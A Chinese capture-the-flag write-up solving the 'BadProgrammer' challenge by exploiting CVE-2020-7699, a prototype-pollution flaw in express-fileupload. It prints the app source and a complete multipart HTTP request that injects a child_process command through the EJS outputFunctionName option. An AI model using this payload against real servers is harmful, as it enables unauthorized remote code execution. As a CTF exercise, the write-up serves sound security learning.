### BadProgrammer WP （`express-fileupload`中间件漏洞）

来源：攻防世界

打开目标地址：

![image-20251220165952317](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220165952317.png)

一个什么信息都没有的页面

用dirsearch扫一下目录：
![image-20251220170030417](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220170030417.png)

访问 `/static../`

![image-20251220170058217](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220170058217.png)

首先查看 `app.js` 代码：

```js
const express = require('express');
const fileUpload = require('express-fileupload');
const app = express();

app.use(fileUpload({ parseNested: true }));
//可以POST一下这个
app.post('/4_pATh_y0u_CaNN07_Gu3ss', (req, res) => {
    res.render('flag.ejs');
});

app.get('/', (req, res) => {
    res.render('index.ejs');
})

app.listen(3000);
app.on('listening', function() {
    console.log('Express server started on port %s at %s', server.address().port, server.address().address);
});
```

POST `/4_pATh_y0u_CaNN07_Gu3ss` 路径

![image-20251220173749816](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220173749816.png)

发现，提示说：

```
flag is in 'flag.txt' 
```

但是一直访问不到`flag.txt`。

#### 现在可以注意下 中间件

```
const fileUpload = require('express-fileupload');
app.use(fileUpload({ parseNested: true }));
```

这个项目中，没有upload路由却引入了中间件。

所以想到：

##### **`express-fileupload`中间件漏洞：CVE-2020-7699。**

这个漏洞存在于`express-fileupload`版本低于1.1.9，在`package.json`中可以看到其版本为1.1.7，可以利用该漏洞：

![image-20251220181814247](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220181814247.png)

通过学习这个漏洞，查看大佬产出的RCE，构建payload：

```
POST /4_pATh_y0u_CaNN07_Gu3ss  HTTP/1.1
Host: 61.147.171.105:60193
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1765873731,1765877825
If-None-Match: W/"4ecf-BRB1SRFii1kA+OilogiQ1K0hP8U"
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------1546646991721295948201928333
Content-Length: 289


-----------------------------1546646991721295948201928333
Content-Disposition: form-data; name="__proto__.outputFunctionName"

x;process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x

-----------------------------1546646991721295948201928333--

```

所以`flag.txt` 就在static/js的目录下了：

![image-20251220192816610](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251220192816610.png)



该漏洞的详细分析请看：

CVE-2020-7699漏洞









